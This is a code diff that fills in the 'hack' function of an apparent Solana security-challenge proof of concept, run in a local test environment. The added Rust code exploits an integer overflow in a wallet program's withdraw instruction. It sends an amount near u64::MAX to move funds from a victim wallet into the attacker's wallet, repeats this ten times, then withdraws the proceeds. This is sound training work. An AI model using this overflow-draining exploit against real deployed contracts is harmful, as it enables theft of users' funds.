@@ -2,13 +2,15 @@ use std::{env, str::FromStr};
 
 use owo_colors::OwoColorize;
 use poc_framework::solana_sdk::signature::Keypair;
-use poc_framework::{
-    keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
-};
+use poc_framework::{keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction};
 use solana_program::native_token::lamports_to_sol;
 
 use pocs::assert_tx_success;
-use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program, sysvar};
+use solana_program::instruction::{AccountMeta, Instruction};
+use level2::{get_wallet_address, withdraw, initialize, WALLET_LEN, WalletInstruction};
+use borsh::BorshSerialize;
+use poc_framework::spl_memo::build_memo;
 
 struct Challenge {
     hacker: Keypair,
@@ -18,7 +20,55 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    // @note - Hack steps
+    // 1) Create Wallet for hacker using contract
+    // 2) Make withdrawal with amount for underflow/overflow amount destination = rich_boi_wallet_address
+    // It gives remove funds from rich_boi_wallet_address and add to hacker_wallet_address
+    // 3) Make withdraw funds from hacker_wallet_address using usual way
+
+    let hacker_wallet_init_ix = initialize(challenge.wallet_program, challenge.hacker.pubkey());
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[hacker_wallet_init_ix],
+            &[&challenge.hacker]
+        )
+    );
+
+    let wallet_min_rent = env.get_rent_excemption(WALLET_LEN as usize);
+    let hacker_wallet_address = get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);
+    for n in 1..=10u8 {
+        let memo_ix = build_memo(n.to_string().as_bytes(), &[]);
+        let exploit_withdraw_ix = Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(hacker_wallet_address, false),
+                AccountMeta::new(challenge.hacker.pubkey(), true),
+                AccountMeta::new(challenge.wallet_address, false),
+                AccountMeta::new_readonly(sysvar::rent::id(), false),
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Withdraw { amount: u64::MAX - (wallet_min_rent - 1) }.try_to_vec().unwrap(),
+        };
+        assert_tx_success(
+            env.execute_as_transaction(
+                &[memo_ix, exploit_withdraw_ix],
+                &[&challenge.hacker],
+            )
+        ).print_named("exploit_withdraw_ix");
+        let hacker_wallet_balance = env.get_account(hacker_wallet_address).unwrap().lamports;
+        let user_wallet_balance = env.get_account(challenge.wallet_address).unwrap().lamports;
+        println!("hacker_wallet_balance {}, user_wallet_balance {}", hacker_wallet_balance, user_wallet_balance);
+    };
+
+    let hacker_withdraw_hacked_amount_ix = withdraw(challenge.wallet_program, challenge.hacker.pubkey(), challenge.hacker.pubkey(), wallet_min_rent * 10);
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[hacker_withdraw_hacked_amount_ix],
+            &[&challenge.hacker],
+        )
+    );
+}
 
 /*
 SETUP CODE BELOW
